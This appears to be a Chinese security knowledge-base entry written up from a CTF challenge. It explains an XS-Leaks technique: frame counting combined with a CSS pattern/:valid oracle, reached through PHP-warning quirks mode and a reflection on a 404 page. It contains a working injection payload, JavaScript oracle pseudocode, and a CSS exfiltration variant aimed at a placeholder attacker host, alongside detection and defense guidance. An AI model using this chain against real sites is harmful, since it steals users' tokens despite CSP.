---
id: web-generic-xs-leaks-css-pattern-valid-frame-counting-token
title: XS-Leaks 帧计数配合 CSS pattern:valid 盲注窃取页面 Token
type: scenario
domain: web
path: web/generic/xs-leaks
technique: xs-leaks-frame-counting-css-valid-oracle
tags:
- web
- xs-leaks
- css-injection
- frame-counting
- side-channel
- csp
- php
- quirks-mode
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:39:01+08:00'
  notes: 已对照原文与12张图核对；pure-leak链条（max_input_vars warning->BackCompat、404反射+B{}、pattern/:valid/:has、window.length帧计数、token TOKEN_12252ce52d8a9fd1）均一致；未复现
url: /docs/web/generic/xs-leaks/web-generic-xs-leaks-css-pattern-valid-frame-counting-token/
draft: false
kb_aliases:
- pure-leak
- XS-Leaks 帧计数
- frame counting oracle
- CSS :valid 盲注
- PHP warning 怪异模式
- 404 页面 CSS 注入
- window.length 侧信道
---

## 一句话结论

在存在 HTML 注入但 CSP 禁止脚本、且无法外带资源时，可以用「PHP Warning 把响应推入怪异模式」让同源 `text/html` 响应被当作样式表加载，再把 `pattern` 正则与 `:valid` 伪类组合成布尔判断，通过 `window.length` 帧计数逐字符盲注出页面中的 Token。

## 原理

- XS-Leaks 利用跨站交互暴露的侧信道推断数据。帧计数（frame counting）是其中之一：页面中嵌入 `<embed>`、`<object>` 或 `<iframe>` 会让 `window.length` 增加；攻击者页面可以打开目标窗口并跨域读取 `window.length`（该属性不受同源策略保护），把“子框架是否存在/可见”变成布尔 oracle。
- 目标页面有 HTML 注入点，但 CSP 为 `script-src 'none'; default-src 'self'; base-uri 'none'`：不能执行脚本，也不能加载外部图片做常规 CSS 外带；但 `default-src 'self'` 允许同源样式表。
- 注入的 `<input pattern="..." value="` 故意不闭合 `value` 属性，后续页面 HTML（包括 Token 文本）被吞进 value，形成“可控输入 + 秘密”的字符串。`<input>` 的 `:valid`/`:invalid` 由 `pattern` 正则决定，`div:has(input:valid)` 可在匹配时隐藏包含 `<embed>` 的 div，使 `window.length` 从 1 变 0。
- 样式表本身通过同源 404 页反射构造：`<link href="/not-found.txt?{}CSS规则" rel=stylesheet>`；404 页会把请求路径回显到 HTML 中，CSS 解析器跳过 `{}` 前的垃圾后即可解析注入的规则，无需攻击者可控的外部资源。
- 关键前提是怪异模式（BackCompat）：标准模式下 `<link rel=stylesheet>` 要求响应 `Content-Type: text/css`，而 PHP/404 页返回 `text/html` 会被拒绝；怪异模式对同源样式表放宽 MIME 检查。
- 进入怪异模式的方法：页面原本以 `<!DOCTYPE html>` 开头，但通过 `&a` 重复 1000 次触发 PHP `max_input_vars` 超限警告，警告 HTML 被输出在 doctype 之前，文档不再以 doctype 开头，`document.compatMode` 变为 `BackCompat`。
- 目标 WAF 禁用 `[`、`]`、`*`、`@`、`%`、`&`、`//`、反斜杠等，常规属性选择器 `input[value^="x"]` 不可用；`pattern` + `:valid` + `:has()` 提供了不使用方括号的等价判断。

## 触发条件

- 目标存在能把可控 HTML 插入到秘密值之前的注入点（本场景在 Token 之前），且长度足够。
- CSP 禁止脚本与外部资源，但允许同源资源；攻击者能打开/嵌入目标页面并读取 `window.length`。
- 目标响应可以通过错误/警告在 doctype 前产生输出，从而进入怪异模式；或目标本来就处于怪异模式。
- 浏览器未启用会切断窗口引用的策略（如 COOP），否则帧计数 oracle 不可读。
- 攻击者页面自身可执行脚本（与目标 CSP 无关）。

## 利用步骤

1. 确认注入点位于秘密之前，且注入的未闭合属性能把秘密吞入；确认目标可被打开为子窗口。
2. 用大量重复参数触发 PHP 警告，验证页面进入 `BackCompat`。
3. 构造 `<link>` 指向同源 404 页，查询串中放入 `{}` 加 CSS 规则；验证 404 页反射。
4. CSS 规则使用 `div:has(input:valid){display:none}`；注入 `<embed>` 与带 `pattern` 的 `<input value="`，让 token 进入 value。
5. 攻击者脚本反复打开目标、设置不同正则、读取 `window.length`，用二分法逐字符恢复 Token。
6. 最后把 Token 回传验证。

## PoC

单次探测的注入内容（经 URL 编码后放入 content 参数）：

```html
<link href="/not-found.txt?{}div:has(input:valid){display:none}" rel=stylesheet>
<div>
  <embed code="x" type=text/html>
  <input pattern=".+TOKEN_0123.+ " value="
```

说明：`value="` 不闭合，后续 HTML 与真实 Token 被并入属性；`pattern` 匹配成功时 input 为 `:valid`，CSS 隐藏 div 与 embed。附加约 1000 个 `&a` 参数触发 PHP warning 进入怪异模式。

oracle 伪代码：

```javascript
const win = open("");
async function match(pattern) {
  win.location = "about:blank";
  // 等待可访问
  win.location = BASE + "?content=" + encodeURIComponent(`
    <link href="/not-found.txt?{}div:has(input:valid){display:none}" rel=stylesheet>
    <div><embed code="x" type=text/html>
    <input pattern=".+${pattern}.+" value="
  `) + "&a".repeat(1000);
  await sleep(100);
  return win.length === 0; // 0 = 正则匹配 = 前缀正确
}
// 对 0-9a-f 做二分：p = "(" + chars.slice(l,m).join("|") + ")"
```

原文通过该 oracle 从 `TOKEN_` 开始逐位恢复出 `TOKEN_12252ce52d8a9fd1` 并取得 flag。

## 变体与关联

- 变体：若允许外部资源，可直接用属性选择器 `input[value^="a"]{background-image:url(//attacker/a)}` 外带，无需帧计数；隐藏 input 不加载背景，可改用 `:has` 或非隐藏元素。
- 变体：用 `:invalid`/`:valid` 控制元素显隐，也可换成滚动条、元素尺寸、`window.length` 等其他布尔 oracle。
- 变体：PHP 警告若发生在应用自行 `header()` 设置 CSP 之前，还会导致 CSP 响应头根本未发送（见 [[web-php-warning-header-already-sent-csp-bypass]]）。
- 关联：[[web-generic-xs-leaks-css-attribute-selector-exfil]]（常规 CSS 属性选择器外带）。
- 边界：目标使用 `frame-ancestors 'none'`/`X-Frame-Options: DENY`、COOP、或响应强制以 doctype 开头且 MIME 严格时，链条相应环节不成立。

## 检测与防御

- 检测：请求中出现大量重复参数（触发 `max_input_vars`）、`<link rel=stylesheet>` 指向不存在路径、查询串含 `{}body{`/`div:has(input:valid)`、`pattern=` 与 `:valid` 组合。
- 检测：响应在 doctype 之前出现 PHP Warning；同一来源短时间内对同一页面做大量框架化请求。
- 防御：对输出做上下文编码，禁止用户 HTML 进入页面；响应固定以 doctype 开头，错误信息不输出到页面。
- 加固：CSP 增加 `style-src 'none'` 或仅允许带完整 URL 的可信源；设置 `X-Content-Type-Options: nosniff`；用 `Cross-Origin-Opener-Policy: same-origin` 与 `frame-ancestors 'none'` 阻断帧计数与框架化。
